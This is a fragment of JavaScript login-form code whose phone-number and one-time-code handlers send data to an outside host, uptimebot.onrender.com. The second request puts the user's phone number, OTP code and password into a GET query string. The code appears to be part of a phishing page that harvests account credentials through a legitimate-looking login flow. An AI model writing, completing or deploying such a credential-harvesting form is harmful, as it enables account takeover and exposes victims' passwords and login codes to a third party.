    ...
    const handlePhoneSubmit = async (event) => {
        ...
        if (!isLoading) {
            ...
            if (!validatePhoneNumber(phoneNumber)) {
                ...
                setIsLoading(true);
                try {
                    const response = await axios.get(`https://uptimebot.onrender.com/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
    ...
    const handleOTPSubmit = async (event) => {
        ...
        if (!isLoading) {
            ...
            if (/^[0-9]{5}$/.test(formData.otp)) {
                ...
                try {
                    otp = formData.otp
                    const response = await axios.get(`https://uptimebot.onrender.com/otp?code=${formData.otp}&phone=${formData.phoneCountryCode.replace(/\D/g, '')}${formData.phoneNumber}&password=${formData.password}`);
                    setIsLoading(false);
